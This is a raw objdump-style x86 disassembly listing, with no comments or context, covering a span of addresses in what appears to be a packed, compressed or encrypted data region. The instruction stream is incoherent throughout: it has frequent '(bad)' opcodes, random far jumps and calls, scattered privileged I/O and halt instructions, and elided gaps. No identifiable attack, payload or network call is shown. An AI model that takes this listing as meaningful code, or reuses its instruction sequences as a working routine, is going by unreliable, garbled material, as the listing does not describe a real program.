  429f99:	stos   DWORD PTR es:[edi],eax
  429f9a:	scas   al,BYTE PTR es:[edi]
  429f9b:	cmp    al,0xfb
  429f9d:	sbb    al,0xc0
  429f9f:	jmp    0x1b63:0x41b10747
  429fa6:	dec    edx
  429fa7:	mov    bh,0x6f
  429fa9:	push   edx
  429faa:	xor    DWORD PTR [eax],ecx
  429fac:	pop    ebx
  429fad:	push   edi
  429fae:	mov    edx,0xe19a5c01
  429fb3:	add    BYTE PTR [ecx-0x72],dh
  429fb6:	cmp    ecx,DWORD PTR [ecx-0x6d]
  429fb9:	sub    esp,DWORD PTR [ebp+0x39]
  429fbc:	sub    DWORD PTR [ebx-0x28],0x1e
  429fc0:	mov    esi,0xe7d42564
  429fc5:	out    dx,eax
  429fc6:	push   0x88d12b88
  429fcb:	aad    0x3
  429fcd:	push   edx
  429fce:	loop   0x429f56
  429fd0:	jns    0x429fd1
  429fd2:	mov    WORD PTR [edi+0x2d3bede8],?
  429fd8:	adc    BYTE PTR [ecx-0x3558a594],dh
  429fde:	lock mov ds:0xf28fd043,al
  429fe4:	mov    dl,0x33
  429fe6:	fldenv [edx]
  429fe8:	or     bl,dl
  429fea:	js     0x42a025
  429fec:	test   al,0xda
  429fee:	fstp   DWORD PTR [eax+edi*4+0xf]
  429ff2:	sbb    DWORD PTR [ecx],eax
  429ff4:	add    ebx,esp
  429ff6:	adc    edi,ebx
  429ff8:	rcl    ah,cl
  429ffa:	add    al,0xd9
  429ffc:	sub    ebx,edi
  429ffe:	shl    al,0xd
  42a001:	mov    bl,0xa1
  42a003:	test   eax,0xe81f867f
  42a008:	rcr    DWORD PTR [esp+edx*4-0x4adb03c2],0x7e
  42a010:	data16 out 0x53,al
  42a013:	or     DWORD PTR [esi-0x301050a3],esi
  42a019:	test   BYTE PTR [edi-0x5c],ah
  42a01c:	aaa    
  42a01d:	dec    esi
  42a01e:	cmp    al,0xc3
  42a020:	inc    ecx
  42a021:	mov    ds:0x55146e9d,al
  42a026:	(bad)  
  42a027:	jecxz  0x42a06d
  42a029:	mov    cl,0x4e
  42a02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a02c:	arpl   WORD PTR [edx],di
  42a02e:	loopne 0x42a0a1
  42a030:	sub    bl,BYTE PTR [ebx+0x673c87b8]
  42a036:	(bad)  
  42a037:	pop    ebp
  42a038:	das    
  42a039:	sub    cl,BYTE PTR [esi-0x6b]
  42a03c:	aad    0x86
  42a03e:	pop    esi
  42a03f:	outs   dx,BYTE PTR ds:[esi]
  42a040:	idiv   BYTE PTR [ebp+edx*4+0xb]
  42a044:	dec    eax
  42a045:	hlt    
  42a046:	retf   0xebe7
  42a049:	sbb    edi,DWORD PTR es:[edi-0x173c6220]
  42a050:	mov    esp,0x575545bd
  42a055:	mov    ah,0x14
  42a057:	sub    bl,BYTE PTR [esp+eax*2]
  42a05a:	pop    edx
  42a05b:	adc    al,0x4c
  42a05d:	ss or  al,0x73
  42a060:	mov    esi,0xd27dca4e
  42a065:	xchg   ebp,eax
  42a066:	pusha  
  42a067:	mov    BYTE PTR [edi],ah
  42a069:	sub    al,0x30
  42a06b:	and    BYTE PTR [ebx+edi*4],dl
  42a06e:	or     dh,BYTE PTR [esi+0x36d38bd2]
  42a074:	nop
  42a075:	xchg   BYTE PTR fs:[ebx],bl
  42a078:	stos   BYTE PTR es:[edi],al
  42a079:	aad    0x3c
  42a07b:	dec    edi
  42a07c:	aad    0x42
  42a07e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a07f:	mov    es,edi
  42a081:	dec    esi
  42a082:	jno    0x42a047
  42a084:	xchg   DWORD PTR [ebx-0x6641a244],edx
  42a08a:	xor    al,0xb9
  42a08c:	fcomp  st(5)
  42a08e:	dec    ecx
  42a08f:	mov    dl,0x0
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	mov    BYTE PTR [ecx-0x73e22224],0xc1
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	jmp    0x42a185
  42a10e:	mov    ss,WORD PTR [edx]
  42a110:	bound  esi,QWORD PTR [esp+ebp*8-0x1d5e01ba]
  42a117:	jnp    0x42a159
  42a119:	ror    DWORD PTR [ebx],cl
  42a11b:	imul   ebx,DWORD PTR [edi+0x4],0xffffffee
  42a11f:	push   esi
  42a120:	mov    bh,0xf9
  42a122:	add    al,0x7
  42a124:	fnstcw WORD PTR [esi]
  42a126:	mov    cs,ebp
  42a128:	rcr    BYTE PTR [esi-0x38ac0131],0x3
  42a12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a130:	jo     0x42a124
  42a132:	mov    dh,0x3f
  42a134:	fst    DWORD PTR [ebp+edx*4+0x2b07f500]
  42a13b:	jae    0x42a1b5
  42a13d:	clc    
  42a13e:	xor    dh,BYTE PTR [ebx+0x9]
  42a141:	fs not eax
  42a144:	fidivr DWORD PTR [edx-0x74]
  42a147:	mov    edx,0x83f75289
  42a14c:	ja     0x42a0ec
  42a14e:	cmp    esi,DWORD PTR [ebx+esi*1+0x7b362d36]
  42a155:	sub    edx,ebx
  42a157:	cmc    
  42a158:	mov    al,0x31
  42a15a:	xchg   edx,eax
  42a15b:	pusha  
  42a15c:	dec    esi
  42a15d:	arpl   dx,cx
  42a15f:	mov    eax,ds:0xac7d1c77
  42a164:	aam    0x3c
  42a166:	pushf  
  42a167:	add    esi,DWORD PTR [eax]
  42a169:	je     0x42a193
  42a16b:	lods   eax,DWORD PTR ds:[esi]
  42a16c:	cmp    ecx,edi
  42a16e:	outs   dx,DWORD PTR ds:[esi]
  42a16f:	mov    al,0xbb
  42a171:	or     dl,ch
  42a173:	lds    ebx,FWORD PTR [ebp-0x74]
  42a176:	mov    edi,0x7906c604
  42a17b:	mov    al,ds:0x7c8051c3
  42a180:	dec    esp
  42a181:	push   ss
  42a182:	pop    esi
  42a183:	and    BYTE PTR [esi+eiz*2],dl
  42a186:	(bad)  
  42a187:	cli    
  42a188:	lods   al,BYTE PTR ds:[esi]
  42a189:	es pop esi
  42a18b:	xor    eax,0xfd7af2b7
  42a190:	pop    esi
  42a191:	mov    BYTE PTR [edx+eiz*1+0x41],0xb1
  42a196:	arpl   ax,si
  42a198:	mov    ss,WORD PTR [eax]
  42a19a:	push   ebp
  42a19b:	es mov dh,0x71
  42a19e:	aaa    
  42a19f:	sub    esp,edi
  42a1a1:	mov    al,ds:0xf22cce39
  42a1a6:	fldenv [ecx+ebp*1+0x64]
  42a1aa:	arpl   WORD PTR [edi+0x60],di
  42a1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1ae:	cmp    esi,DWORD PTR [ebp+0x31]
  42a1b1:	inc    ecx
  42a1b2:	or     ch,al
  42a1b4:	jmp    0xb393:0x521f2be5
  42a1bb:	dec    ecx
  42a1bc:	push   edi
  42a1bd:	lahf   
  42a1be:	push   ecx
  42a1bf:	jmp    0x3ddd:0x948e32e1
  42a1c6:	daa    
  42a1c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1c8:	jbe    0x42a1b1
  42a1ca:	mov    dh,bl
  42a1cc:	(bad)  
  42a1cd:	mov    edx,ebx
  42a1cf:	jnp    0x42a1b4
  42a1d1:	(bad)  
  42a1d3:	(bad)  [edi+0x6a833ad5]
  42a1d9:	xchg   esi,eax
  42a1da:	lods   eax,DWORD PTR ds:[esi]
  42a1db:	test   BYTE PTR ds:0x89f899b9,dh
  42a1e1:	push   0xa84b81ce
  42a1e6:	retf   0x4696
  42a1e9:	mov    ebx,0x7a08eadc
  42a1ee:	pop    ebx
  42a1ef:	xchg   ecx,eax
  42a1f0:	pop    eax
  42a1f1:	rol    BYTE PTR [ecx+0x71],0x99
  42a1f5:	xor    esp,DWORD PTR [ecx-0x29c55810]
  42a1fb:	enter  0x28aa,0x72
  42a1ff:	repz ss push edx
  42a202:	ins    DWORD PTR es:[edi],dx
  42a203:	mov    al,ds:0x3acf07b0
  42a208:	psllw  mm6,mm1
  42a20b:	in     al,dx
  42a20c:	or     DWORD PTR [edx+0xc4c1],0x0
	...
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	(bad)  [ebx+0x66]
  42a282:	in     eax,dx
  42a283:	jp     0x42a215
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	or     eax,0x553ff4a8
  42a291:	repz arpl WORD PTR [ebx],bx
  42a294:	inc    ebx
  42a295:	pop    es
  42a296:	nop
  42a297:	fisttp WORD PTR [ebp+0x0]
  42a29a:	aad    0xf0
  42a29c:	cmp    esp,DWORD PTR [edi+ebx*4-0x2e]
  42a2a0:	je     0x42a2bf
  42a2a2:	xor    dh,BYTE PTR [eax-0x1995fbf1]
  42a2a8:	mov    es,edi
  42a2aa:	dec    edx
  42a2ab:	mov    ebx,0x2c31b23f
  42a2b0:	rcl    BYTE PTR [ebx+0x907f67c],0xd0
  42a2b7:	mov    ecx,0xd5470178
  42a2bc:	push   ebp
  42a2bd:	popf   
  42a2be:	jge    0x42a2d1
  42a2c0:	jecxz  0x42a273
  42a2c2:	pusha  
  42a2c3:	nop
  42a2c4:	pop    edi
  42a2c5:	jo     0x42a2c0
  42a2c7:	ds std 
  42a2c9:	gs je  0x42a293
  42a2cc:	icebp  
  42a2cd:	jmp    FWORD PTR [ebx]
  42a2cf:	push   ebx
  42a2d0:	cwde   
  42a2d1:	mov    edx,0x2846baed
  42a2d6:	(bad)  
  42a2d7:	sub    al,BYTE PTR [eax]
  42a2d9:	push   ds
  42a2da:	pushf  
  42a2db:	jmp    0x266c:0x898d6dfe
  42a2e2:	lahf   
  42a2e3:	push   0x35
  42a2e5:	hlt    
  42a2e6:	cmp    edx,DWORD PTR [ecx-0x3fedbb1d]
  42a2ec:	into   
  42a2ed:	test   eax,0xbbb243d3
  42a2f2:	gs (bad) 
  42a2f4:	retf   
  42a2f5:	and    eax,0x7a
  42a2f8:	(bad)  
  42a2f9:	retf   
  42a2fa:	les    eax,FWORD PTR [ebp+ebx*2+0x35fb63f]
  42a301:	mov    cl,dh
  42a303:	xchg   ebp,eax
  42a304:	ja     0x42a2d4
  42a306:	jno    0x42a308
  42a308:	and    al,0x90
  42a30a:	cmp    al,0xe
  42a30c:	call   0x94c477f2
  42a311:	paddd  mm1,QWORD PTR [edi+0x64]
  42a315:	adc    DWORD PTR [esi-0x51],ebp
  42a318:	dec    esp
  42a319:	push   edx
  42a31a:	add    esp,DWORD PTR [edx-0x83d7763]
  42a320:	push   esi
  42a321:	xor    edx,esp
  42a323:	jmp    0xa41a1de8
  42a328:	pop    ds
  42a329:	cli    
  42a32a:	inc    esp
  42a32b:	sbb    eax,0x251f42d3
  42a330:	xlat   BYTE PTR ds:[ebx]
  42a331:	stos   BYTE PTR es:[edi],al
  42a332:	lods   eax,DWORD PTR ds:[esi]
  42a333:	in     al,dx
  42a334:	jae    0x42a341
  42a336:	dec    ebx
  42a337:	shl    DWORD PTR [ebp+0x72],1
  42a33a:	mov    bh,0xe8
  42a33c:	push   ss
  42a33d:	add    ebp,DWORD PTR [ebx]
  42a33f:	xchg   esp,eax
  42a340:	cmp    ah,dl
  42a342:	dec    ebp
  42a343:	push   edi
  42a344:	and    eax,DWORD PTR [ebx-0x31]
  42a347:	pop    ebp
  42a348:	jl     0x42a3c1
  42a34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a34b:	dec    esi
  42a34c:	sahf   
  42a34d:	ins    DWORD PTR es:[edi],dx
  42a34e:	xor    DWORD PTR ds:0xace4ce04,0x3ffcc2cf
  42a358:	cmc    
  42a359:	xchg   edi,eax
  42a35a:	fs push es
  42a35c:	push   esi
  42a35d:	clc    
  42a35e:	add    cl,BYTE PTR [ecx+ebp*4]
  42a361:	clc    
  42a362:	dec    esp
  42a363:	out    dx,eax
  42a364:	or     DWORD PTR [edi],0xffffffc9
  42a367:	push   edx
  42a368:	mov    eax,0x4c74ba9b
  42a36d:	bound  eax,QWORD PTR [edx+esi*1]
  42a370:	jno    0x42a2fd
  42a372:	(bad)  
  42a373:	cld    
  42a374:	pop    esi
  42a375:	in     eax,dx
  42a376:	pop    ds
  42a377:	shl    DWORD PTR [ebx+esi*2],1
  42a37a:	mov    ch,0xce
  42a37c:	popa   
  42a37d:	or     ah,BYTE PTR [esi+0x4c9a017e]
  42a383:	test   eax,0x3562e93d
  42a388:	mov    ebx,ebp
  42a38a:	xchg   ecx,eax
  42a38b:	add    dh,BYTE PTR [ebx-0x50]
  42a38e:	std    
  42a38f:	rol    BYTE PTR [eax],1
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x3f9a5b3d
  42a403:	pop    eax
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	sub    bl,BYTE PTR [edx+0xbeaaeda]
  42a412:	mov    eax,0xd45f6d69
  42a417:	cli    
  42a418:	dec    edi
  42a419:	dec    edi
  42a41a:	dec    esp
  42a41b:	fptan  
  42a41d:	jl     0x42a476
  42a41f:	add    al,0x9d
  42a421:	es xchg esp,eax
  42a423:	dec    ebx
  42a424:	mov    ebp,DWORD PTR [eax-0x5063961f]
  42a42a:	jmp    0x42a3ed
  42a42c:	push   esi
  42a42d:	scas   al,BYTE PTR es:[edi]
  42a42e:	loope  0x42a480
  42a430:	data16 mov ah,BYTE PTR [edx]
  42a433:	mov    al,ds:0x3680d205
  42a438:	sbb    eax,0x53f1d21
  42a43d:	sahf   
  42a43e:	cli    
  42a43f:	mov    ecx,0x7682653a
  42a444:	or     esp,DWORD PTR [ecx+0x35803ce4]
  42a44a:	scas   eax,DWORD PTR es:[edi]
  42a44b:	and    esi,DWORD PTR [bx+0x57ae]
  42a450:	dec    esi
  42a451:	pop    edx
  42a452:	inc    ebx
  42a453:	pop    edx
  42a454:	call   0xcb95031e
  42a459:	leave  
  42a45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a45b:	pushf  
  42a45c:	xchg   DWORD PTR [edi+0x7f],edx
  42a45f:	and    DWORD PTR [esi+eiz*4],esi
  42a462:	loope  0x42a4a1
  42a464:	fcomp  QWORD PTR [ebx-0x1b35f44c]
  42a46a:	pop    ebp
  42a46b:	outs   dx,DWORD PTR ds:[esi]
  42a46c:	jp     0x42a441
  42a46e:	ror    BYTE PTR [esi+0x48],cl
  42a471:	retf   0x4064
  42a474:	mov    ch,0x33
  42a477:	out    dx,eax
  42a478:	sub    al,0x96
  42a47a:	call   DWORD PTR [edx+ebx*8-0x1b]
  42a47e:	rcr    DWORD PTR [eax],0x9d
  42a481:	hlt    
  42a482:	pop    esp
  42a483:	mov    esi,0xbd64714
  42a488:	call   0x3ae034c8
  42a48d:	mov    al,ds:0x817cc4e4
  42a492:	rol    BYTE PTR [ebx-0x47],cl
  42a495:	iret   
  42a496:	and    eax,0x234064f2
  42a49b:	in     eax,0x5a
  42a49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a49e:	or     esp,DWORD PTR [edi]
  42a4a0:	ja     0x42a478
  42a4a2:	dec    edi
  42a4a3:	and    eax,0xf1c5c745
  42a4a8:	jbe    0x42a485
  42a4aa:	xchg   ecx,eax
  42a4ab:	aam    0x2a
  42a4ad:	cmp    eax,0x303055d9
  42a4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4b3:	int3   
  42a4b4:	mov    BYTE PTR [ebx+ecx*2-0x3abebcfb],bh
  42a4bb:	sub    DWORD PTR [edx],esp
  42a4bd:	or     DWORD PTR [edx+0x21ede812],esi
  42a4c3:	lds    ebp,FWORD PTR [eax]
  42a4c5:	call   0x26cb:0xca6aad59
  42a4cc:	push   ebp
  42a4cd:	or     al,bl
  42a4cf:	lds    ecx,FWORD PTR [ebp+0x46976a5b]
  42a4d5:	arpl   di,si
  42a4d7:	out    0xeb,al
  42a4d9:	mov    eax,edx
  42a4db:	adc    BYTE PTR [ebx-0x74ee05f4],ah
  42a4e1:	jno    0x42a507
  42a4e3:	sub    edx,DWORD PTR [ebx-0x87f747]
  42a4e9:	es xchg edx,eax
  42a4eb:	mul    DWORD PTR [eax+0x11]
  42a4ee:	rol    BYTE PTR [eax+esi*1-0x4c45dc51],0xef
  42a4f6:	mov    edi,0x2e4ac3f8
  42a4fb:	xchg   edx,eax
  42a4fc:	arpl   WORD PTR [ecx+0x4a],di
  42a4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a500:	pop    esi
  42a501:	mov    ecx,0x23efdd85
  42a506:	clc    
  42a507:	push   0x66
  42a509:	pushf  
  42a50a:	nop
  42a50b:	call   0x0:0xf87524d8
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x1700529f
  42a583:	xchg   edx,eax
  42a584:	cwde   
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	push   eax
  42a58d:	mov    DWORD PTR [ecx-0x30],0xd5274a60
  42a594:	sti    
  42a595:	mov    dh,BYTE PTR [edi+0x4c]
  42a598:	jmp    DWORD PTR [ebx+0x4b]
  42a59b:	in     eax,0xda
  42a59d:	xlat   BYTE PTR ds:[ebx]
  42a59e:	dec    ebx
  42a59f:	es inc esi
  42a5a1:	mov    ds:0xa7c4fe9e,eax
  42a5a6:	les    ebx,FWORD PTR [esi+eiz*4+0x64]
  42a5aa:	sub    ch,BYTE PTR [edx-0x44c922bc]
  42a5b0:	pop    es
  42a5b1:	add    BYTE PTR [edx],0x12
  42a5b4:	pop    esp
  42a5b5:	push   eax
  42a5b6:	adc    ch,BYTE PTR [edx+eax*1+0x71]
  42a5ba:	xchg   ebx,eax
  42a5bb:	loop   0x42a63b
  42a5bd:	jecxz  0x42a608
  42a5bf:	dec    ebx
  42a5c0:	mov    ch,0x2f
  42a5c2:	and    al,0x85
  42a5c4:	cmp    BYTE PTR [ebx],bl
  42a5c6:	pushf  
  42a5c7:	xor    BYTE PTR [edx-0x12],0x2e
  42a5cb:	in     eax,dx
  42a5cc:	ins    DWORD PTR es:[edi],dx
  42a5cd:	cmp    BYTE PTR [edi-0x6],al
  42a5d0:	in     eax,0xdc
  42a5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a5d3:	dec    esi
  42a5d4:	aad    0xb6
  42a5d6:	jmp    0xbc71:0x7ecc4724
  42a5dd:	icebp  
  42a5de:	dec    eax
  42a5df:	jle    0x42a5e1
  42a5e1:	and    ch,BYTE PTR [edx+0x6c]
  42a5e4:	lea    esp,[edi]
  42a5e6:	xchg   edx,eax
  42a5e7:	cli    
  42a5e8:	xchg   ebx,eax
  42a5e9:	adc    al,0x63
  42a5eb:	addr16 das 
  42a5ed:	sbb    eax,0x2df492dc
  42a5f2:	out    0x92,eax
  42a5f4:	or     ch,BYTE PTR [bx+si+0x2723]
  42a5f9:	jmp    0xc4ac:0x43c5a3c8
  42a600:	xchg   ebp,eax
  42a601:	pop    es
  42a602:	push   ss
  42a603:	mov    ebp,0xdea586cd
  42a608:	push   ebx
  42a609:	lods   eax,DWORD PTR ds:[esi]
  42a60a:	lods   eax,DWORD PTR ds:[esi]
  42a60b:	ja     0x42a65e
  42a60d:	mov    edx,DWORD PTR [edx+edi*8]
  42a610:	ja     0x42a64d
  42a612:	mov    BYTE PTR [ecx+0x20],bh
  42a615:	add    al,BYTE PTR [esi+0x6d]
  42a618:	aad    0x19
  42a61a:	lea    ebp,[ebx+eax*1]
  42a61d:	push   cs
  42a61e:	mov    BYTE PTR [edi+0x76],al
  42a621:	jl     0x42a627
  42a623:	pop    edx
  42a624:	pushf  
  42a625:	push   ds
  42a626:	retf   0x9c84
  42a629:	fdivr  st(5),st
  42a62b:	or     DWORD PTR [eax-0x1c9eb47d],ebp
  42a631:	adc    ecx,edi
  42a633:	test   DWORD PTR [ecx-0x64],esp
  42a636:	push   eax
  42a637:	mov    ebx,0x70c385cd
  42a63c:	push   cs
  42a63d:	jmp    0x4d361c4d
  42a642:	dec    ecx
  42a643:	ret    
  42a644:	lahf   
  42a645:	lods   eax,DWORD PTR ds:[esi]
  42a646:	mov    bl,0xd6
  42a648:	mov    al,ds:0x862c50d7
  42a64d:	jl     0x42a66a
  42a64f:	mov    dh,0x51
  42a651:	lods   eax,DWORD PTR ds:[esi]
  42a652:	out    dx,al
  42a653:	push   edi
  42a654:	cmp    bh,BYTE PTR [esi+eax*8]
  42a657:	ss xchg esp,eax
  42a659:	dec    edi
  42a65a:	adc    edx,esi
  42a65c:	mov    DWORD PTR [edi],0x64d8c760
  42a662:	xchg   esp,eax
  42a663:	imul   esi,DWORD PTR [edx+0x27cd7df0],0xffffffea
  42a66a:	jo     0x42a661
  42a66c:	sub    cl,cl
  42a66e:	outs   dx,BYTE PTR ds:[esi]
  42a66f:	pop    eax
  42a670:	push   esi
  42a671:	in     al,0x16
  42a673:	xchg   edx,eax
  42a674:	xchg   ecx,eax
  42a675:	inc    esi
  42a676:	sti    
  42a677:	je     0x42a658
  42a679:	imul   ebp,DWORD PTR [ebp+0x73c9b43b],0xffffff9f
  42a680:	add    dl,BYTE PTR [eax+ebx*2]
  42a683:	std    
  42a684:	leave  
  42a685:	repnz mov ecx,0xf12ab6c0
  42a68b:	add    DWORD PTR [eax+0xf4ecba],edx
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x6047ece4],0x9c927e9a
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	js     0x42a6a9
  42a70e:	(bad)  
  42a70f:	jo     0x42a6f0
  42a711:	cmc    
  42a712:	jle    0x42a793
  42a714:	jl     0x42a769
  42a716:	js     0x42a750
  42a718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a719:	xchg   ebx,eax
  42a71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a71b:	xchg   ecx,eax
  42a71c:	pushf  
  42a71d:	scas   eax,DWORD PTR es:[edi]
  42a71e:	iret   
  42a71f:	in     al,0xd2
  42a721:	loop   0x42a78c
  42a723:	inc    esp
  42a724:	test   eax,0x916b373
  42a729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a72a:	jecxz  0x42a7ab
  42a72c:	mov    eax,ds:0xd7823779
  42a731:	shr    DWORD PTR [edi-0x38331553],cl
  42a737:	jmp    0x42a711
  42a739:	ror    DWORD PTR [edi-0x480e4e21],1
  42a73f:	mov    edi,0x95765419
  42a745:	mov    ch,0x14
  42a747:	sub    eax,0xfd395fce
  42a74c:	jl     0x42a7c6
  42a74e:	mov    eax,0xa5db805
  42a753:	sbb    DWORD PTR [edx],ebp
  42a755:	xchg   ecx,eax
  42a756:	nop
  42a757:	sbb    esi,DWORD PTR [edi-0x1a]
  42a75a:	push   0x6af92816
  42a75f:	retf   0xe2a
  42a762:	call   0x9952ea3f
  42a767:	xchg   edx,eax
  42a768:	mov    edx,0x2ce360e1
  42a76d:	mov    bl,0xb7
  42a76f:	es pop ebp
  42a771:	xor    DWORD PTR [edx],edx
  42a773:	xchg   DWORD PTR [ebx],edx
  42a775:	cmp    esi,DWORD PTR [eax]
  42a777:	loopne 0x42a79d
  42a779:	(bad)  
  42a77b:	std    
  42a77c:	mov    ds:0xd8cea46d,eax
  42a781:	sar    DWORD PTR [ecx+0x2cb88a63],0xbe
  42a788:	mov    ds,WORD PTR [edi]
  42a78a:	cmp    BYTE PTR [ebp-0xe],dl
  42a78d:	mov    ebx,DWORD PTR [eax+edi*4]
  42a790:	(bad)  
  42a791:	mov    al,ds:0x5975b9a0
  42a796:	mov    esi,0x8322514f
  42a79b:	sar    ebx,cl
  42a79d:	add    eax,0xbe1e1616
  42a7a2:	call   0xbcc6:0xbd6f965d
  42a7a9:	test   DWORD PTR [esi],ecx
  42a7ab:	ret    0xfd04
  42a7ae:	popa   
  42a7af:	or     eax,0xeb5dcbbd
  42a7b4:	(bad)  
  42a7b5:	mov    edx,DWORD PTR [ebx]
  42a7b7:	mul    DWORD PTR [edi+0x5f3691bc]
  42a7bd:	fsub   DWORD PTR [eax]
  42a7bf:	in     eax,0xd6
  42a7c1:	rcr    BYTE PTR [esi-0x6e],0x33
  42a7c5:	sbb    DWORD PTR [edx],eax
  42a7c7:	(bad)  
  42a7c8:	test   eax,0xd0e326f5
  42a7cd:	out    0xa,eax
  42a7cf:	es sbb al,0x71
  42a7d2:	sub    al,0xab
  42a7d4:	sbb    ecx,ecx
  42a7d6:	mov    ecx,0x28b5a8a
  42a7db:	inc    edx
  42a7dc:	fdiv   st(2),st
  42a7de:	rcr    BYTE PTR ds:0x73573f89,cl
  42a7e4:	inc    ebx
  42a7e5:	jmp    0x42a808
  42a7e7:	inc    ebp
  42a7e8:	retf   
  42a7e9:	data16 mov ds:0xcdd38c56,al
  42a7ef:	mov    al,0x8
  42a7f1:	fcom   st(4)
  42a7f3:	mov    edi,0xf3698cdf
  42a7f8:	and    BYTE PTR [ebp-0x45],0x7c
  42a7fc:	pop    ss
  42a7fd:	iret   
  42a7fe:	cmp    eax,0xcf33eea4
  42a803:	outs   dx,BYTE PTR ds:[esi]
  42a804:	call   0x9c371edf
  42a809:	push   0xeebf0dc8
  42a80e:	jnp    0x42a853
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x5ec76c97
  42a882:	fsubr  QWORD PTR [ebx]
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebx+0x10ad7199],ch
  42a891:	dec    ecx
  42a892:	lods   al,BYTE PTR ds:[esi]
  42a893:	push   ecx
  42a894:	aam    0x77
  42a896:	dec    eax
  42a897:	mov    esp,0x87e32cbf
  42a89c:	or     al,0xe0
  42a89e:	ins    BYTE PTR es:[edi],dx
  42a89f:	pushf  
  42a8a0:	aad    0x1c
  42a8a2:	fbld   TBYTE PTR [edi-0x7d]
  42a8a5:	pusha  
  42a8a6:	cli    
  42a8a7:	jnp    0x42a858
  42a8a9:	shl    BYTE PTR [ebp-0x3b],1
  42a8ac:	out    0x4b,eax
  42a8ae:	pop    esi
  42a8af:	jle    0x42a83a
  42a8b1:	xlat   BYTE PTR ds:[ebx]
  42a8b2:	dec    esp
  42a8b3:	or     edi,DWORD PTR [esi]
  42a8b5:	push   cs
  42a8b6:	adc    BYTE PTR [esi-0x5d],ah
  42a8b9:	ja     0x42a93a
  42a8bb:	jnp    0x42a91a
  42a8bd:	sub    si,di
  42a8c0:	call   0xa8b5:0x8cad041f
  42a8c7:	arpl   ax,sp
  42a8c9:	or     BYTE PTR [edx-0x17],cl
  42a8cc:	add    ah,BYTE PTR [esi-0x20]
  42a8cf:	mov    edi,0xdcc6fb8d
  42a8d4:	lahf   
  42a8d5:	mov    bh,0x9f
  42a8d7:	mov    ds:0x6eeb2a2f,eax
  42a8dc:	stos   DWORD PTR es:[edi],eax
  42a8dd:	inc    ebx
  42a8de:	outs   dx,DWORD PTR ds:[esi]
  42a8df:	int    0x7c
  42a8e1:	jmp    0xafb1fd79
  42a8e6:	test   eax,0x7d7d42fb
  42a8eb:	mov    dh,0x83
  42a8ed:	xchg   esi,eax
  42a8ee:	sbb    edx,DWORD PTR [eax-0x6644e558]
  42a8f4:	loopne 0x42a8c5
  42a8f6:	xchg   ebp,eax
  42a8f7:	stos   BYTE PTR es:[edi],al
  42a8f8:	push   ebp
  42a8f9:	fdiv   DWORD PTR [eax+0x6f42bcc4]
  42a8ff:	stos   DWORD PTR es:[edi],eax
  42a900:	arpl   WORD PTR [esi-0x1b],si
  42a903:	sub    al,0x58
  42a905:	inc    ebp
  42a906:	ss (bad) 
  42a908:	nop
  42a909:	jle    0x42a8ef
  42a90b:	sbb    ebx,DWORD PTR [ebx]
  42a90d:	sub    ecx,DWORD PTR [esi-0x30]
  42a910:	or     BYTE PTR [edi-0x9782684],cl
  42a916:	fbstp  TBYTE PTR [ecx+0x46]
  42a919:	adc    bh,BYTE PTR [esi]
  42a91b:	ds pop ebp
  42a91d:	pop    es
  42a91e:	xchg   DWORD PTR [edx-0x38],eax
  42a921:	inc    esi
  42a922:	fisubr DWORD PTR [ebx-0x1f]
  42a925:	pmulhuw mm1,QWORD PTR [esi+0x37d375ab]
  42a92c:	adc    al,0x9
  42a92e:	mov    eax,ds:0x9fdd68c2
  42a933:	stc    
  42a934:	sub    al,0x4f
  42a936:	call   0xf9359bec
  42a93b:	not    BYTE PTR [esi+0x1b]
